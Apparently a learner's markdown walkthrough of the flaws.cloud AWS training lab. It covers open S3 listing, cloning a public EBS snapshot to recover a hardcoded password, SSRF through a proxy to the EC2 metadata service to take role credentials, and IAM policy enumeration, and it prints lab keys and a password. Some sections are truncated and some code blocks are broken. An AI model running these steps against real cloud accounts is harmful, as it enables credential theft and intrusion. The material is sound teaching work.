## Level 1 - list S3 from outside

> https://flaws.cloud/

<font color=red> This level is *buckets* of fun. See if you can find the first sub-domain </font>


- The site flaws.cloud is hosted as an S3 bucket.
  - a great way to host a static site
  - When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud).
  - S3 buckets are a global name space

> so could create a bucket named `berry.com`
> and berry would never be able host their main site via S3 hosting.

1. determine the site is hosted as an S3 bucket by running a DNS lookup on the domain

    ```bash
    $ dig flaws.cloud
    # ; <<>> DiG 9.10.6 <<>> flaws.cloud
    # ...
    # ;; ANSWER SECTION:
    # flaws.cloud.		5	IN	A	52.218.201.235
    ```

2. Visiting `54.231.184.255`, it's `https://aws.amazon.com/s3/`
   - flaws.cloud is hosted as an S3 bucket.


3. find region
   - nslookup
   - cyberduck: browse this bucket and it will figure out the region automatically.
   - it's hosted in the region us-west-2

    ```bash
    nslookup 54.231.184.255
    # Non-authoritative answer:
    # 255.184.231.54.in-addr.arpa     name = s3-website-us-west-2.amazonaws.com
    ```

4. its permissions are a little loose.
   - bucket named `flaws.cloud` in `us-west-2`
   1. go to the link `https://flaws.cloud.s3.amazonaws.com/`
   2. browse the bucket by aws cli

        ```bash
        $ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
        # 2017-03-13 23:00:38       2575 hint1.html

        ```

5. go to the link `https://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html`

set up S3 buckets with permissions
- shouldn't allow bucket listings.
  - Directory listing of S3 bucket of Legal Robot (link) and Shopify (link).
  - list the files simply by going to `https://flaws.cloud.s3.amazonaws.com/`
- Read and write permissions to S3 bucket for Shopify again (link) and Udemy (link).

<font color=red> The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier </font>

`aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`


```bash
$ aws s3 ls s3://flevel2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

## Level 3 - check the git log

> Level 3: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

<font color=red> The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
 </font>


```bash
# 1. list the files in this directory, and seen that listing in this bucket is open to "Everyone".

1. key
   - should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often.
2. list right
   - can't restrict the ability to list only certain buckets in AWS
   - if give the ability to list some buckets in an account, they will be able to list them all.

## Level 4 - protect the volume screenshot

> http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/

<font color=red> For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. </font>

1. find the account ID

```bash
# to do some enumeration of the user:
# STS  Security Token Service, handles security controls of various AWS accounts.
# The other one to check would be IAM.
$ aws sts get-caller-identity \
    --profile flaws
# {
#     "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
#     "Account": "975426262029",
#     "Arn": "arn:aws:iam::975426262029:user/backup"
# }
```

2. find the snapshot


```bash
$ aws ec2 describe-snapshots \
    --owner-id 975426262029 \
    --profile flaws
# {
#     "Snapshots": [
#         {
#             "Description": "",
#             "Encrypted": false,
#             "OwnerId": "975426262029",
#             "Progress": "100%",
#             "SnapshotId": "snap-0b49342abd1bdcb89",
#             "StartTime": "2017-02-28T01:35:12+00:00",
#             "State": "completed",
#             "VolumeId": "vol-04f1c039bc13ea950",
#             "VolumeSize": 8,
#             "Tags": [
#                 {
#                     "Key": "Name",
#                     "Value": "flaws backup 2017.02.27"
#                 }
#             ]
#         }
#     ]
# }


# check the permissions on this snapshot
aws ec2 describe-snapshot-attribute \
    --snapshot-id snap-0b49342abd1bdcb89 \
    --attribute createVolumePermission \
    --profile flaws
# {
#     "CreateVolumePermissions": [ { "Group": "all" } ],
#     "SnapshotId": "snap-0b49342abd1bdcb89"
# }
# anyone can create a volume based on this snapshot!
```


3. create-volume

```bash
# create an EC2 volume for us-west-2 with the snapshot-id of the public EC2 snapshot found earlier.
aws ec2 create-volume \
    --availability-zone us-west-2a \
    --region us-west-2 \
    --snapshot-id snap-0b49342abd1bdcb89 \

# verify that it worked, seeing the volume listed.
aws ec2 describe-volumes \
    --region us-west-2
```

4. create ec2


```bash
# create an EC2 in the us-west-2 region

# 1. in the storage options, choose the volume you just created.

# 2. attach the volume to the instance
aws ec2 attach-volume \
    --volume-id vol-0fb33b360dc095bf9 \
    --instance-id i-0b2f1bdcbfda7602b \
    --device /dev/sdf \
    --region us-west-2


# see the instance using
aws ec2 describe-instances \
    --region us-west-2


# SSH in:
ssh -i YOUR_KEY.pem ec2-user@ec2-54-191-240-80.us-west-2.compute.amazonaws.com
```


5. mount it.

```bash
# list available drives:
lsblk
# Returns:
#  NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
#  xvda        202:0    0   8G  0 disk
#  --xvda1     202:1    0   8G  0 part /
#  xvdb        202:16   0   8G  0 disk
#  --xvdb1     202:17   0   8G  0 part

sudo file -s /dev/xvdb1
# Returns:
#  /dev/xvdb1: Linux rev 1.0 ext4 filesystem data, UUID=5a2075d0-d095-4511-bef9-802fd8a7610e, volume name "cloudimg-rootfs" (extents) (large files) (huge files)

# Next we mount it
sudo mkdir /mnt/flaws/
sudo mount /dev/xvdf1 /mnt/flaws

# show the mount
mount

```

6. browse to `/mnt/flaws`
   - Ubuntu is the only user for the volume.
   - in the home file, a bash script for setting up the server.
   - Included in that file is a hardcoded password
   - take the credentials flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M (username:password)
   - and try them on the web portal that we were asked to authenticate too earlier.

```bash
# Running some variant of `find /mnt -mtime -1` will help to find recent files, which you can filter further using:

$ find /mnt -type f -mtime -1 2>/dev/null | grep -v "/var/" | grep -v "/proc/" | grep -v "/dev/" | grep -v "/sys/" | grep -v "/run/" | less


$ cat /home/ubuntu/setupNginx.sh
# htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

Lesson learned

AWS allows snapshots of EC2's and databases (RDS).
- The main purpose for that is to make backups
- but people sometimes use snapshots to get access back to their own EC2's when they forget the passwords.
- This also allows attackers to get access to things.
- Snapshots are normally restricted to your own account, so a possible attack would be
  - an attacker getting access to an AWS key that allows them to start/stop and do other things with EC2's
  - and then uses that to snapshot an EC2
  - and spin up an EC2 with that volume in your environment to get access to it.

## Level 5 - gain metadata from magic ip 169.254.169.254

> http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/


<font color=red>

This EC2 has a simple HTTP only proxy on it.

Here are some examples of it's usage:
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/

See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.

</font>


1. find the credential

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud \
    --profile flaws
# An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied


# the structure to use the proxy is:
URL/proxy/2ndURL


# In the given URLs this looks like it just redirects us.
# In cloud environments like AWS, GCP, Azure etc, there is an IP that instances can view for metadata.
# This is known as the magic address 169.254.169.254.
# This is the same across all major providers and has been the target for very prolific attacks such as CapitalOne breach.
# We can’t reach the magic address from where we are normally, only things within the cloud environment can see it.
# However, since the EC2 instance is proxying our traffic, we can get that to hit the magic address for us.

# to view metadata:
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/

```

2. manually put this in our profile configuration file.

```bash
vim ~/.aws/credentials
# [flaws2]
# aws_access_key_id = ASIA6GG7PSQG3Z37DUWV
# aws_secret_access_key = jGW0vsJZV4UxMbkAZXW/7+cEyjRd1UPmNt0Jdokq
# aws_session_token = IQoJb3JpZ2luX2VjECMaCXV...45PGHVF05TUZ6AQ==


aws sts get-caller-identity \
    --profile flaws2
# {
#     "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",
#     "Account": "975426262029",
#     "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
# }
```

3. list the bucket

```bash

aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud \
    --profile flaws2
#                            PRE ddcc78ff/

aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ \
    --profile flaws2
# 2017-03-02 23:36:23       2463 hint1.html

`169.254.169.254`, magic IP in the cloud world.
- AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves.
- Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header.
- AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see.
- A similar problem to getting access to the IAM profile's access keys is access to the EC2's user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials.

Avoiding this mistake
- Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges.
- ensure that IAM roles are restricted as much as possible.

## Level 6 - enumerate the policy

> http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/


<font color=red>
For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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
</font>

1. find out who you are

```bash

#             "PolicyName": "MySecurityAudit",
#             "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
#         }
#     ]
# }
```

2. check the `list_apigateways` policy

```bash
# know the PolicyArn, get it's version id:
aws iam get-policy  \
    --policy-arn arn:aws:iam::975426262029:policy/list_apigateways \
    --profile flaws6
# {
#     "Policy": {
#         "PolicyName": "list_apigateways",
#         "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
#         "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
#         "Path": "/",
#         "DefaultVersionId": "v4",
#         "AttachmentCount": 1,
#         "PermissionsBoundaryUsageCount": 0,
#         "IsAttachable": true,
#         "Description": "List apigateways",
#         "CreateDate": "2017-02-20T01:45:17+00:00",
#         "UpdateDate": "2017-02-20T01:48:17+00:00"
#     }
# }


# Now that you have the ARN and the version id, you can see what the actual policy is:
aws iam get-policy-version  \
    --policy-arn arn:aws:iam::975426262029:policy/list_apigateways \
    --version-id v4 \
    --profile flaws6
# {
#     "PolicyVersion": {
#         "Document": {
#             "Version": "2012-10-17",
#             "Statement": [
#                 {
#                     "Action": [ "apigateway:GET" ],
#                     "Effect": "Allow",
#                     "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
#                 }
#             ]
#         },
#         "VersionId": "v4",
#         "IsDefaultVersion": true,
#         "CreateDate": "2017-02-20T01:48:17+00:00"
#     }
# }


# The API gateway in this case is used to call a lambda function
```


3. check the `MySecurityAudit` policy

```bash
aws iam get-policy  \
    --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit \
    --profile flaws6
# "DefaultVersionId": "v1",


aws iam get-policy-version \
    --policy-arn arn:aws:iam::975426262029:policy/MySecurityAudit \
    --version-id v1 \
    --profile flaws6
# {
#     "PolicyVersion": {
#         "Document": {
#             "Version": "2012-10-17",
#             "Statement": [
#                 {
#                     "Action": [
#                         "acm:Describe*",
#                         "acm:List*",
#                         "application-autoscaling:Describe*",
#                         "athena:List*",
#                         "autoscaling:Describe*",
#                         "lambda:GetAccountSettings",
#                         "lambda:GetPolicy",
#                         "lambda:List*",
#                         ...
#                     ] } ] } } }


# The SecurityAudit policy lets you see some things about lambdas:
aws lambda list-functions \
    --region us-west-2 \
    --profile flaws6
# {
#     "Functions": [
#         {
#             "FunctionName": "Level6",
#             "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",

#             "Handler": "lambda_function.lambda_handler",
#             "CodeSize": 282,
#             "Description": "A starter AWS Lambda function.",
#             "Timeout": 3,
#             "MemorySize": 128,
#             "LastModified": "2017-02-27T00:24:36.054+0000",
#             "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
#             "Version": "$LATEST",

#             "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
#             "PackageType": "Zip"
#         }
#     ]
# }


# the SecurityAudit also lets you run:
aws lambda get-policy \
    --region us-west-2 \
    --profile flaws6 \
    --function-name Level6
# {
#     "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
#     "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
# }


# the ability to execute `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\` That "s33ppypa75" is a rest-api-id, which you can then use with that other attached policy:
aws apigateway get-stages \
    --rest-api-id "s33ppypa75" \
    --region us-west-2 \
    --profile flaws6 \
# {
#     "item": [
#         {
#             "deploymentId": "8gppiv",
#             "stageName": "Prod",

#         }
#     ]
# }

# the stage name is "Prod". Lambda functions are called using that rest-api-id, stage name, region, and resource as https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6

Lesson learned
---

It is common to give people and entities read-only permissions such as the SecurityAudit policy.
- The ability to read your own and other's IAM policies can really help an attacker figure out what exists in your environment and look for weaknesses and mistakes.
A
voiding this mistake
- Don't hand out any permissions liberally, even permissions that only let you read meta-data or know what your permissions are.
